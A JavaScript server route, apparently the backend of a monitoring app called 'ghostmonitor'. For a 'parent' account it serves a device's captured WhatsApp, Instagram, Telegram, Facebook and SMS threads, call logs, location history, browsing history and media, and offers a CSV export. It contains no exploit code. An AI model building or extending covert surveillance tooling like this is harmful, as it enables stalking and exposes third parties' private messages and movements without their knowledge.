const { execute }    = require('./_db');
const { getSession } = require('./_session');

module.exports = async (req, res) => {
    const session = getSession(req);
    if (!session?.parentEmail) return res.status(401).json({ error: 'Unauthorized' });

    const email  = session.parentEmail;
    const type   = req.query.type   || 'overview';
    const action = req.query.action || '';

    try {
        if (action === 'export') {
            const [rows] = await execute(
                `SELECT app_type, contact_name, content, direction,
                        to_timestamp(timestamp/1000) as datetime
                 FROM conversations WHERE parent_email = $1 ORDER BY timestamp DESC`, [email]
            );
            res.setHeader('Content-Type', 'text/csv');
            res.setHeader('Content-Disposition', `attachment; filename="ghostmonitor_${new Date().toISOString().slice(0,10)}.csv"`);
            let csv = 'App,Contact,Message,Direction,DateTime\n';
            rows.forEach(r => {
                csv += [r.app_type, r.contact_name, (r.content||'').substring(0,200).replace(/,/g,' '), r.direction, r.datetime].join(',') + '\n';
            });
            return res.send(csv);
        }

        if (type === 'overview') {
            const [stats] = await execute(
                `SELECT COUNT(*) as total_messages,
                        SUM(CASE WHEN app_type='CALLS' THEN 1 ELSE 0 END) as total_calls
                 FROM conversations WHERE parent_email=$1
                 AND to_timestamp(timestamp/1000) >= CURRENT_DATE`, [email]
            );
            const [locStats] = await execute(
                `SELECT COUNT(*) as location_updates FROM locations
                 WHERE parent_email=$1 AND to_timestamp(timestamp/1000) >= CURRENT_DATE`, [email]
            );
            const [devices] = await execute(
                `SELECT device_id, last_seen,
                        CASE WHEN last_seen >= NOW() - INTERVAL '3 minutes' THEN 'online' ELSE 'offline' END as status
                 FROM devices WHERE parent_email=$1 ORDER BY last_seen DESC`, [email]
            );
            return res.json({
                total_messages:   parseInt(stats[0]?.total_messages)      || 0,
                total_calls:      parseInt(stats[0]?.total_calls)         || 0,
                location_updates: parseInt(locStats[0]?.location_updates) || 0,
                devices
            });
        }

        const appMap = { whatsapp:'WHATSAPP', instagram:'INSTAGRAM', telegram:'TELEGRAM', facebook:'FACEBOOK', sms:'SMS' };
        if (appMap[type]) {
            const appType = appMap[type];
            if (action === 'thread') {
                const contactId = req.query.contact_id || '';
                const [msgs] = await execute(
                    `SELECT id, direction, content, media_meta,
                            to_timestamp(timestamp/1000) as datetime, timestamp
                     FROM conversations WHERE parent_email=$1 AND app_type=$2 AND contact_id=$3
                     ORDER BY timestamp ASC LIMIT 500`,
                    [email, appType, contactId]
                );
                return res.json({ messages: msgs });
            }
            const search = req.query.search || '';
            const params = [email, appType];
            let q = `SELECT contact_id, contact_name, COUNT(*) as message_count,
                            MAX(timestamp) as last_ts,
                            to_timestamp(MAX(timestamp)/1000) as last_message_time,
                            (SELECT content FROM conversations c2
                             WHERE c2.parent_email=c.parent_email AND c2.app_type=c.app_type
                             AND c2.contact_id=c.contact_id ORDER BY timestamp DESC LIMIT 1) as last_message
                     FROM conversations c WHERE parent_email=$1 AND app_type=$2`;
            if (search) { q += ` AND (contact_name ILIKE $3 OR contact_id ILIKE $3)`; params.push(`%${search}%`); }
            q += ' GROUP BY contact_id, contact_name ORDER BY last_ts DESC LIMIT 200';
            const [contacts] = await execute(q, params);
            return res.json({ contacts });
        }

        if (type === 'calls') {
            const start = req.query.start ? new Date(req.query.start).getTime() : Date.now() - 86400000;
            const end   = req.query.end   ? new Date(req.query.end).getTime()   : Date.now();
            const [calls] = await execute(
                `SELECT contact_name, contact_id, direction, content,
                        to_timestamp(timestamp/1000) as datetime, timestamp
                 FROM conversations WHERE parent_email=$1 AND app_type='CALLS'
                 AND timestamp BETWEEN $2 AND $3 ORDER BY timestamp DESC LIMIT 500`,
                [email, start, end]
            );
            return res.json({ calls });
        }

        if (type === 'location' || type === 'locations') {
            const start = req.query.start ? new Date(req.query.start).getTime() : Date.now() - 86400000;
            const end   = req.query.end   ? new Date(req.query.end).getTime()   : Date.now();
            const [locations] = await execute(
                `SELECT lat, lng, accuracy, to_timestamp(timestamp/1000) as datetime, timestamp
                 FROM locations WHERE parent_email=$1 AND timestamp BETWEEN $2 AND $3
                 ORDER BY timestamp ASC LIMIT 1000`,
                [email, start, end]
            );
            return res.json({ locations });
        }

        if (type === 'browsing') {
            const filter = req.query.filter || 'today';
            const since  = filter === 'week' ? Date.now() - 7*86400000 : filter === 'month' ? Date.now() - 30*86400000 : new Date().setHours(0,0,0,0);
            const [history] = await execute(
                `SELECT contact_name as title, content as url,
                        to_timestamp(timestamp/1000) as datetime, timestamp
                 FROM conversations WHERE parent_email=$1 AND app_type='BROWSING' AND timestamp>=$2
                 ORDER BY timestamp DESC LIMIT 500`,
                [email, since]
            );
            return res.json({ history });
        }

        if (type === 'media') {
            const [media] = await execute(
                `SELECT app_type, contact_name, media_meta,
                        to_timestamp(timestamp/1000) as datetime, timestamp
                 FROM conversations WHERE parent_email=$1 AND app_type='MEDIA' AND media_meta IS NOT NULL
                 ORDER BY timestamp DESC LIMIT 200`,
                [email]
            );
            return res.json({ media });
        }

        res.status(400).json({ error: 'Unknown type' });
    } catch (e) {
        console.error('[data]', e.message);
        res.status(500).json({ error: e.message });
    }
};
